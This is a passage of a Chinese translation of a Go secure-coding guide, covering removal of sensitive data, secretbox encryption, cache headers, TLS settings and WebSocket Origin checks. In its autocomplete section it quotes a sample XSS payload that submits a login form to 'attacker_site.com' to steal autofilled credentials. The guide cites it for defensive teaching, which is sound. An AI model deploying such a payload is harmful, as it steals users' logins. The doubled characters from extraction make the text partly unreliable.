你应该始终删除⽣生产环境上的应⽤用程序和系统⽂文档。有些⽂文档可能会公开⼀一些版本或功能(例例如Readme、Changelog等)，这些功能可以被⽤用来攻击
web应⽤用程序。
作为开发⼈人员，你应该允许⽤用户删除不不再使⽤用的敏敏感信息。假设⽤用户帐户上的信⽤用卡过期了了，想要删除它们 — web应⽤用程序应该允许这样做。
所有不不再需要的信息必须从应⽤用程序中删除。
web应⽤用程序中，每个⾼高度敏敏感的信息都应该加密。使⽤用Go中提供的军⽤用级加密；有关更更多信息，请参⻅见加密实践部分。
如果需要在其他地⽅方执⾏行行的的代码，那么只需编译并共享⼆二进制⽂文件 — 没有可靠的解决⽅方案来防⽌止逆向⼯工程。
获得访问代码的不不同权限并限制源代码的访问是最好的⽅方法。
不不要在客户端以明⽂文或任何⾮非加密安全的⽅方式存储密码、连接字符串串(参⻅见“数据安全 部分，如何保护数据库连接字符串串的示例例”⼀一节)或其他敏敏感信
息。这些敏敏感信息还包括以不不安全的格式嵌⼊入的内容（如Adobe ﬂash或已编译的代码）。
go中，使⽤用外部包 golang.org/x/crypto/nacl/secretboxin 进⾏行行加密的⼩小例例⼦子：
删除敏敏感信息
注释
URL
信息就是⼒力力量量
加密是关键
bloodzer0&Lingfighting
// Load your secret key from a safe place and reuse it across multiple
// Seal calls. (Obviously don't use this example key for anything
// real.) If you want to convert a passphrase to a key, use a suitable
// package like bcrypt or scrypt.
secretKeyBytes, err := hex.DecodeString("6368616e676520746869732070617373776f726420746f206120736563726574")
if err != nil {
    panic(err)
}
var secretKey [32]byte
copy(secretKey[:], secretKeyBytes)
// You must use a different nonce for each message you encrypt with the
// same key. Since the nonce here is 192 bits long, a random value
// provides a sufficiently small probability of repeats.
var nonce [24]byte
if _, err := rand.Read(nonce[:]); err != nil {
    panic(err)
}
// This encrypts "hello world" and appends the result to the nonce.
encrypted := secretbox.Seal(nonce[:], []byte("hello world"), &nonce, &secretKey)
// When you decrypt, you must use the same nonce and key you used to
// encrypt the message. One way to achieve this is to store the nonce
// alongside the encrypted message. Above, we stored the nonce in the first
// 24 bytes of the encrypted text.
var decryptNonce [24]byte
copy(decryptNonce[:], encrypted[:24])
decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], &decryptNonce, &secretKey)
if !ok {
    panic("decryption error")
}
fmt.Println(string(decrypted))
输出：
hello world
另⼀一种简单有效的缓解攻击的⽅方法是确保在系统中禁⽤用任何不不必要的应⽤用程序或服务。
根据Mozilla⽂文档，您可以在整个表单中，使⽤用以下⽅方法禁⽤用⾃自动完成功能：
或特定的表单元素：
这对于在登录表单上禁⽤用⾃自动完成功能特别有⽤用。假设在登录⻚页⾯面中存在XSS向量量。如果恶意⽤用户创建了了如下有效负载：
window.setTimeout(function() {
  document.forms[0].action = 'http://attacker_site.com';
  document.forms[0].submit();
}
), 10000);
禁⽤用不不需要的内容
⾃自动完成
bloodzer0&Lingfighting
它将⾃自动填充表单字段发送到 attacker_site.com 。
⻚页⾯面中，包含敏敏感信息的缓存控制应该被禁⽤用。 这可以通过设置相应的header标志来实现，如下⾯面的代码⽚片段所示：
w.Header().Set("Cache-Control", "no-cache, no-store")
w.Header().Set("Pragma", "no-cache")
no-cache 告诉浏览器器在使⽤用任何缓存信息之前与服务器器重新验证（防⽌止从缓存中获取过期的资源），⽽而不不是告诉浏览器器不不要缓存。
另⼀一⽅方⾯面， no-store 值实际上是 — 停⽌止缓存!，并且不不能存储请求或响应的任何部分。
Pragma 头⽤用于⽀支持HTTP/1.0请求。
在讨论通信安全性时，开发⼈人员应该确保⽤用于通信的通道是安全的。通信类型包括服务器器-客户端、服务器器-数据库以及所有后端通信。这些数据必须
加密，以保证数据的完整性，并防⽌止与通信安全相关的常⻅见攻击。如果不不能保证这些通道的安全，就会发⽣生像MITM这样的攻击，让犯罪分⼦子拦截并
读取这些通道中的流量量。
本节涵盖以下通讯渠道: - HTTP/TLS - Websockets
TLS/SSL是⼀一种加密协议，它允许在其他不不安全的通信通道上进⾏行行加密。它最常⻅见的⽤用途是提供安全的HTTP通信，也称为HTTPS。该协议确保以下
属性适⽤用于通信通道:
隐私
身份验证
数据完整性
它在Go中的实现在 crypto/tls 包中。在本节中，我们将重点介绍Go的实现和⽤用法。虽然协议设计的理理论部分和它的加密实践超出了了本⽂文的范
围，但是本⽂文档的加密实践 部分还是提供了了更更多信息。
以下是使⽤用TLS的HTTP的简单示例例：
import "log"
import "net/http"
func main() {
  http.HandleFunc("/", func (w http.ResponseWriter, req *http.Request) {
    w.Write([]byte("This is an example server.\n"))
  })
  // yourCert.pem - path to your server certificate in PEM format
  // yourKey.pem -  path to your server private key in PEM format
  log.Fatal(http.ListenAndServeTLS(":443", "yourCert.pem", "yourKey.pem", nil))
}
这是⼀一个，在⽤用Go实现的web服务器器中，简单的开箱即⽤用的SSL实现。值得注意的是，这个示例例在SSL实验室中获得了了“A”。
为了了进⼀一步提⾼高通信安全，可以在header中添加以下标志，以强制执⾏行行HSTS (HTTP严格传输安全)：
w.Header().Add("Strict-Transport-Security", "max-age=63072000; includeSubDomains")
Go的TLS实现在crypto/ TLS包中。在使⽤用TLS时，请确保使⽤用了了单个标准TLS实现，并对其进⾏行行了了适当的配置。
基于前⾯面的例例⼦子实现SNI（Server Name Indication）：
缓存
通信安全
HTTP/TLS
bloodzer0&Lingfighting
...
type Certificates struct {
    CertFile    string
    KeyFile     string
}
func main() {
    httpsServer := &http.Server{
        Addr: ":8080",
    }
    var certs []Certificates
    certs = append(certs, Certificates{
        CertFile: "../etc/yourSite.pem", //Your site certificate key
        KeyFile:  "../etc/yourSite.key", //Your site private key
    })
    config := &tls.Config{}
    var err error
    config.Certificates = make([]tls.Certificate, len(certs))
    for i, v := range certs {
        config.Certificates[i], err = tls.LoadX509KeyPair(v.CertFile, v.KeyFile)
    }
    conn, err := net.Listen("tcp", ":8080")
    tlsListener := tls.NewListener(conn, config)
    httpsServer.Serve(tlsListener)
    fmt.Println("Listening on port 8080...")
}
需要注意的是，在使⽤用TLS时，证书应该是有效的，拥有正确的域名，不不应该过期，并且应该在需要时安装中间证书，如OWASP SCP快速参考指南
所建议的那样。
重要提示：⽆无效的TLS证书应该始终被拒绝。确保在⽣生产环境中，没有将InsecureSkipVerify配置设置为true。
以下代码段是如何设置的示例例：
config := &tls.Config{InsecureSkipVerify: false}
使⽤用正确的主机名以设置服务器器名称：
config := &tls.Config{ServerName: "yourHostname"}
另⼀一种已知的TLS攻击被称为POODLE。 当客户端不不⽀支持服务器器的密码时，它与TLS连接回退有关。 这允许将连接降级为易易受攻击的密码。
默认情况下，Go禁⽤用SSLv3，可以使⽤用以下配置，来设置密码的最⼩小版本和最⼤大版本：
// MinVersion contains the minimum SSL/TLS version that is acceptable.
// If zero, then TLS 1.0 is taken as the minimum.
  MinVersion uint16
// MaxVersion contains the maximum SSL/TLS version that is acceptable.
// If zero, then the maximum version supported by this package is used,
// which is currently TLS 1.2.
  MaxVersion uint16
可以通过SSL实验室，来检查，使⽤用的密码的安全性。
⼀一个通常⽤用于减轻降级攻击的附加标志，是RFC7507中定义的TLSFALLBACKSCSV。 在Go中，没有回退。
引⽤用Google开发者Adam Langley的话：
bloodzer0&Lingfighting
Go客户端不不执⾏行行回退，因此不不需要发送TLSFALLBACKSCSV。
另⼀一种称为CRIME的攻击会影响使⽤用压缩的TLS会话。 压缩是核⼼心协议的⼀一部分，但它是可选的。⽤用Go语⾔言编写的程序可能并不不容易易受到攻击，原
因很简单，因为⽬目前 crypto/tls 不不⽀支持压缩机制。⼀一个需要记住的重要注意事项是，如果Go包装器器⽤用于外部安全库，应⽤用程序可能很容易易受到
攻击。
TLS的另⼀一部分与重新协商连接有关。为了了确保没有建⽴立不不安全的连接，请使⽤用 GetClientCertificate 及其相关的错误代码，以防握⼿手终⽌止。
可以捕获错误代码以防⽌止使⽤用不不安全的通道。
所有请求也应编码为预定的字符编码，例例如UTF-8。 这可以在header中设置：
w.Header().Set("Content-Type", "Desired Content Type; charset=utf-8")
处理理HTTP连接时的另⼀一个重要⽅方⾯面是，验证HTTP头在访问外部站点时，不不包含任何敏敏感信息。既然连接可能不不安全，那么HTTP报头就可能泄漏漏信
息。
WebSocket是为HTML 5开发的⼀一种新的浏览器器功能，它⽀支持完全交互式应⽤用程序。使⽤用WebSockets，浏览器器和服务器器都可以通过⼀一个TCP套接字发
送异步消息，⽽而⽆无需使⽤用⻓长轮询或短轮训。
本质上，WebSocket是客户机和服务器器之间的标准双向TCP套接字。这个套接字以常规HTTP连接开始，然后在HTTP握⼿手之后“升级”为TCP套接字。
任何⼀一⽅方都可以在握⼿手之后发送数据。
HTTP Websocket握⼿手中的 Origin  header⽤用于确保Websocket接受的连接来⾃自可信的原始域。执⾏行行失败可能导致跨站点请求伪造(CSRF)。
服务器器负责在初始HTTP WebSocket握⼿手中验证Origin头。 如果服务器器未在初始WebSocket握⼿手中验证原始header，则WebSocket服务器器可能接受
来⾃自任何源的连接。
Websockets
Origin header
bloodzer0&Lingfighting
以下示例例使⽤用Origin头检查，以防⽌止攻击者执⾏行行CSWSH（跨站点WebSocket劫持）。
应⽤用程序应该验证 Host 和 Origin ，以确保请求的 Origin 是可信任的 Origin ，否则拒绝连接。